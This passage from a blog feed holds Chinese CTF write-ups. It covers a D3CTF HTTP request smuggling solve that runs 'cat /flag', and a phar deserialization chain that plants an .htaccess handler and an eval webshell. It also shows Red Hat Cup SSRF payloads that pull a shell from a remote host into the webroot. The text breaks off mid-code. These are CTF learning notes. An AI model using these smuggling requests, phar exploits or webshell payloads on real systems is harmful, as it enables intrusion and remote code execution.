zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>把代码保存到本地看一下，是个很好看的页面，并且可以看到是通过cmd进行出传参的</p><p><a href="https://imgchr.com/i/QpmebV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/27/QpmebV.md.png" alt="QpmebV.md.png"></a></p><p>再走私个POST包拿到flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 710</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /WebConsole/exec HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/WebConsole/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"></span><br><span class="line">cmd=cat+/flag</span><br></pre></td></tr></table></figure><p>这道题在拿这个cmd传参接口的地方有一些不懂的地方，特地请教了一下@Li4n0师傅</p><p>这里判断IP的代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)</span><br></pre></td></tr></table></figure><p>代码问题为：如果ip不是正确的ipv4格式，这段代码会将其判断为内网ip。</p><p>而走私的意义在于，我们的正常请求会被反代把client-ip设置为remote_addr，而我们通过走私就可以自己设置client-ip,通过拼接，最后上述问题代码在处理的时候就会将其判断为内网ip，拿到所需页面</p><p>整体思路为走私一个请求使其留在缓冲区，下一次准备请求的时候，这个缓冲区留下的请求就会被发送，比如：</p><p><img src="https://s2.ax1x.com/2019/11/27/QC1PoR.jpg" alt="QC1PoR.jpg"></p><p>从这张图我们可以清晰的看到上一次留在缓冲区的请求，在这一次被成功发送，并且下面的请求被反代设置了client-ip，所以我们可以通过client-ip的拼接来实现内网ip检测的bypass。</p><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个关键点</p><ul><li>Upload文件上传</li><li>__destruct写文件</li><li>__toString扫目录</li></ul><p>题目给了一个提示为</p><p>hint1: webroot changes every 10 mins</p><p>也就是我们所在的目录是会随机变得</p><p>而且由于__destruct触发的file_put_contents工作目录为根目录，所以需要先知道目前所处绝对路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">    <span class="keyword">echo</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么思路就比较清晰了</p><p>首先传一个phar文件上去，接着通过file_get_contents触发phar反序列化得到目前所处目录，接着通过data协议写一个htaccess进去，由于对htaccess进行了一些过滤，需要通过下面的payload绕过一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>最后通过__destruct写入把我们的木马写入这个txt中即可解析</p><h4 id="当前绝对路径获取"><a href="#当前绝对路径获取" class="headerlink" title="当前绝对路径获取"></a>当前绝对路径获取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了避免文件内容被关键词黑名单检测，可以将phar文件用gzip压缩，将生成的test.phar.gz放到vps上</p><p>通过upload上传到userdir下，接下来通过file_get_contents触发phar反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;phar:&#x2F;&#x2F;upload&#x2F;xx&#x2F;test.phar.gz</span><br></pre></td></tr></table></figure><p>即可通过触发phar反序列化拿到路径</p><h4 id="写入htaccess"><a href="#写入htaccess" class="headerlink" title="写入htaccess"></a>写入htaccess</h4><p>因为这个userdir已经控制掉了一些php的相关后缀，并且连&lt;和?都已经过滤掉了 ，直接写php是肯定不可能了，所以可以考虑写htaccess，并且通过__destruct触发的file_put_contents将文件写到这个目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;data:image&#x2F;png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><h4 id="写入txt"><a href="#写入txt" class="headerlink" title="写入txt"></a>写入txt</h4><p>触发phar反序列化写入txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userdir = <span class="string">'&lt;?php eval($_POST[1]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filename = <span class="string">"/var/www/html/webroot/upload/userdir/xx"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp= <span class="keyword">new</span> dir();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样gzip压缩一下，通过phar协议访问Phar://xxx/xx.gz触发phar,再去访问这个txt，可以看到已经被解析为php</p><p>拿到马会发现有个open_basedir限制，传统payload bypass下就可以了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019红帽杯线下题目漏洞分析</title>
    <link href="http://yoursite.com/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2019-11-26T04:21:55.000Z</published>
    <updated>2019-11-26T04:22:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太理想，题目也都比较基础，可惜没都做出来，打到下午三点左右..状态差到快睡着了….，这篇文章是这场线下的一些个人总结，也是新的学习生活的开始(每次都要靠剪卡尺来摆脱某些感情问题…真希望以后不会被感情问题所困扰…做一个莫得感情的人吧，emm，这应该真的是最后一次尝试了，不过失败的有点可笑，还是专心于做事吧，少想一些有的没的)</p><h3 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h3><p>题目本身存在Tp5的rce，感觉大家都是TPscan一把梭的，当时做出来了就没怎么审这道题的源码，看放的wp，还是存在很多漏洞的，这里说一下</p><h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><p>Home\Controller\test.php中dlfile函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dlfile</span><span class="params">($file_url, $save_to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$file_url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $file_content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $downloaded_file = fopen($save_to, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($downloaded_file, $file_content);</span><br><span class="line">        fclose($downloaded_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数看起来有点像内置后门，我们可以控制两个参数，可以控制curl的对象和返回结果储存的地方</p><p>源码中还贴心的给了payload(- -</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; &#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;http:&#x2F;&#x2F;xxxx&#x2F;shell.txt&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#x2F;&#x2F;&#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\Uploadify.php中preview函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preview</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line">$DIR = <span class="string">'preview'</span>;</span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">@mkdir($DIR);</span><br><span class="line">&#125;</span><br><span class="line">$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">$tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line"><span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line"><span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">@unlink($tmpfilePath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line">$previewUrl = sprintf(</span><br><span class="line"><span class="string">"%s://%s%s"</span>,</span><br><span class="line"><span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">$_SERVER[<span class="string">'HTTP_HOST'</span>],$_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span 